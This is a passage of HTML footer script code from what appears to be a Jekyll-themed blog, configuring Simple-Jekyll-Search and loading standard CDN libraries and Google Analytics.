src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-H1DGTBDGQ7"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-H1DGTBDGQ7'); }); </script>
